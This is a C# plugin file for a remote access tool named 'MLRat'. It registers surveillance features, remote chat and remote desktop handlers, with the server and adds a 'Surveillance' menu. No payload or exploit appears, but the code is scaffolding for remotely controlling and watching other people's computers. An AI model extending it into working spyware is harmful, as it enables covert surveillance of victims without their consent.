using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using MLRat.Server;
using ServerPlugin.InterfaceHandle;
using MLSurveillanceServer.Handlers;
using MLSurveillanceSharedCode.Network;

namespace MLSurveillanceServer
{
    class ServerPlugin : IServerPlugin
    {
        public MLPluginInfomation PluginInfomation
        {
            get
            {
                return new MLPluginInfomation("MLSurveillance")
                {
                    Description = "Core plugin",
                    Developer = "BahNahNah",
                };
            }
        }

        public void OnClientConnect(IClient client)
        {
            RemoteChatHandler.NewClient(client);
            RemoteDesktopHandler.NewClient(client);
        }

        public void OnClientDisconnect(IClient client)
        {
            RemoteChatHandler.ClientDisconnect(client);
            RemoteDesktopHandler.Disconnect(client);
        }

        public void OnDataRetrieved(IClient client, object[] data)
        {
            NetworkCommand command = (NetworkCommand)data[0];
            switch(command)
            {
                case NetworkCommand.RemoteChat:
                    RemoteChatHandler.Handle(client, data);
                    break;
                case NetworkCommand.RemoteDesktop:
                    RemoteDesktopHandler.Handle(client, data);
                    break;
            }
        }

        public void OnPluginLoad(IServerUIHandler UIHost)
        {

            MLRatContextEntry surv = new MLRatContextEntry();
            surv.Text = "Surveillance";
            surv.Icon = "camera.png";
            surv.SubMenus = new MLRatContextEntry[]
            {
                    //new MLRatContextEntry(){ Text = "Remote Desktop", OnClick = RemoteDesktopHandler.ContextCallback, Icon="desktop.png" },
                    new MLRatContextEntry() { Text = "Remote Chat", OnClick = RemoteChatHandler.ContextCallback, Icon="chat.png" }
            };
            UIHost.AddContext(surv);
        }
    }
}
